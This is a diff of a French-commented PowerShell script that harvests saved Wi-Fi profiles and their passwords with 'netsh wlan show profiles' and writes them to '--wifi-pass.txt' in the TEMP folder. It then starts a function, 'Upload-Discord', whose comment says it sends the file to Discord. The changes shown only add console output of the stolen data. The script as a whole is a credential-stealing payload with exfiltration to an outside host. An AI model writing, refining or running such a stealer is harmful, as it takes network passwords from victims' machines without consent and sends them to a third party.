@@ -7,8 +7,16 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-O
     }
 }
 
+# Afficher les informations Wi-Fi récupérées
+Write-Host "Informations Wi-Fi récupérées :"
+Write-Host $wifiProfiles
+
 # Écriture des informations dans un fichier texte
 $wifiProfiles | Out-File -FilePath $env:TEMP/--wifi-pass.txt
+
+# Vérification du contenu du fichier texte
+Write-Host "Contenu du fichier texte :"
+Get-Content $env:TEMP/--wifi-pass.txt
 
 # Envoi du fichier à Discord
 function Upload-Discord {
